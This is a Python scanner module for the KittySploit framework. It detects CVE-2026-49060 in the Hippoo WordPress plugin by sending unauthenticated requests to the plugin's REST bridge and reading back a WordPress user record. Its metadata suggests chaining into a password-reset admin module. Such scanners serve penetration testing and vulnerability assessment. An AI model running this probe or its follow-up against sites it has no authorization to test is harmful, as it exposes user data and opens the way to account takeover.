#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hippoo <= 1.9.4 unauthenticated user API read (CVE-2026-49060)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "hippoo"
_VULN_HIGH = (1, 9, 4)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Hippoo CVE-2026-49060 detect",
        "description": (
            "Detects unauthenticated GET of wp/v2/users/1 via wc-hippoo REST bridge."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-49060",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-49060"],
        "modules": [
            "auxiliary/admin/http/hippoo_cve_2026_10580_password_reset",
            "scanner/http/hippoo_cve_2026_10580_detect",
        ],
        "tags": ["web", "scanner", "wordpress", "hippoo", "bac", "cve-2026-49060"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/hippoo_cve_2026_10580_password_reset"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "User ID to fetch", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        uid = int(self.user_id or 1)
        paths = (
            f"/wp-json/wc-hippoo/v1/ext/wp/v2/users/{uid}",
            f"/?rest_route=/wc-hippoo/v1/ext/wp/v2/users/{uid}",
        )
        for p in paths:
            resp = self.http_request(method="GET", path=self._join(p), allow_redirects=False)
            body = resp.text or "" if resp else ""
            if (
                resp
                and int(resp.status_code or 0) == 200
                and '"slug"' in body
                and "rest_forbidden" not in body
            ):
                self.set_info(
                    severity="critical",
                    reason="Hippoo REST exposes WordPress user object without auth",
                    path=p,
                    cve="CVE-2026-49060",
                )
                return True
        return False
